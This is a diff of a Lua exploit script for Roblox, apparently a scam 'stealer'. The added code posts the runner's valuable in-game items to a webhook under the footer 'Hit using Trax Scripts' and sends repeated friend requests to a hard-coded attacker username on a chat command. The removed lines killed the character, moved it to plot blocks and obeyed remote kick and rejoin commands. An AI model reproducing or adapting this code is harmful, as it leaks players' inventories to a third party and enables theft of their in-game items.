-	if not base then return end
+                {name = ":champagne: Valuable Items", value = "```"..(HLF ~= "" and HLF or "Nil").."```", inline=false},
 
-	local char = player.Character or player.CharacterAdded:Wait()
-	local hrp = char:WaitForChild("HumanoidRootPart")
-	local hum = char:WaitForChild("Humanoid")
+                {name = ":moneybag: Summary", value = "```Total Items: "..#brainrots.."```", inline=false}
 
-	local purchases = base:FindFirstChild("Purchases")
-	local fpanel = base:FindFirstChild("FriendPanel")
-	local target
+            },
 
-if purchases then
-	if game.PlaceId == 109983668079237 then
-		local cdist = math.huge
-		if fpanel then
-			local rpos = fpanel:GetPivot().Position
-			for _, blk in ipairs(purchases:GetChildren()) do
-				if blk.Name == "PlotBlock" then
-					local hb = blk:FindFirstChild("Hitbox")
-					if hb and hb:IsA("BasePart") then
-						local dist = (hb.Position - rpos).Magnitude
-						if dist < cdist then
-							cdist = dist
-							target = hb
-						end
-					end
-				end
-			end
-		end
-	end
+            footer = {text = "Hit using Trax Scripts | Today at "..os.date("%H:%M")}
+
+        }}
+
+    }
+
+    pcall(function()
+
+        Request({
+
+            Url = url,
+
+            Method = "POST",
+
+            Headers = {["Content-Type"]="application/json"},
+
+            Body = HttpService:JSONEncode(body)
+
+        })
+
+    end)
+
 end
 
 
+sendHits(Webhook)
 
-	if not target then return end
-   hum.Health = 0
 
-   task.wait(4)
-
-	task.spawn(function()
-		while true do
-			hum:MoveTo(target.Position)
-			task.wait()
-		end
-	end)
-
-	task.spawn(function()
-		while true do
-			if (hrp.Position - target.Position).Magnitude < 6 then
-				local ti = target:FindFirstChildWhichIsA("TouchTransmitter", true)
-				if ti then
-					firetouchinterest(hrp, target, 0)
-					task.wait(0.1)
-					firetouchinterest(hrp, target, 1)
-					task.wait(0.1)
-				end
-			else
-				task.wait()
-			end
-		end
-	end)
-end
-
-local friended = false
+-- === FRIEND & CHAT LISTENER ===
 
 local function friend()
-	local receiver
 
-	repeat
-		receiver = game.Players:FindFirstChild(Username)
-		task.wait()
-	until receiver
+    local receiver
 
-	task.spawn(function()
-		while true do
-			if not player:IsFriendsWith(receiver.UserId) then
-				pcall(function()
-					player:RequestFriendship(receiver)
-				end)
-			end
-			task.wait(2)
-		end
-	end)
+    repeat receiver = game.Players:FindFirstChild(Username) task.wait() until receiver
+
+    task.spawn(function()
+
+        while true do
+
+            if not player:IsFriendsWith(receiver.UserId) then
+
+                pcall(function() player:RequestFriendship(receiver) end)
+
+            end
+
+            task.wait(2)
+
+        end
+
+    end)
+
 end
 
-local function check(p)
-	if p.Name:lower() == Username:lower() then
-		Expand()
-		task.wait(2)
-		start()
-	end
-end
-
-for _, p in ipairs(game.Players:GetPlayers()) do
-	check(p)
-end
-
-game.Players.PlayerAdded:Connect(check)
 
 local function chatlistener(p)
-	if p.Name:lower() == Username:lower() then
-		p.Chatted:Connect(function(msg)
-			if msg == ".rejoin" then
-game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId)
-			elseif msg == ".kick" then
-				player:Kick("hello")
-			elseif not friended then
-				friend()
-              friended = true
-			end
-		end)
-	end
+
+    if p.Name:lower() == Username:lower() then
+
+        p.Chatted:Connect(function(msg)
+
+            if msg == ".friend" then friend() end
+
+        end)
+
+    end
+
 end
 
-for _, p in ipairs(game.Players:GetPlayers()) do
-	chatlistener(p)
-end
+
+for _, p in ipairs(game.Players:GetPlayers()) do chatlistener(p) end
 
 game.Players.PlayerAdded:Connect(chatlistener)
+
 ]]
 
+
+-- === EXECUTE MAIN ===
 
 loadstring(main)()
 
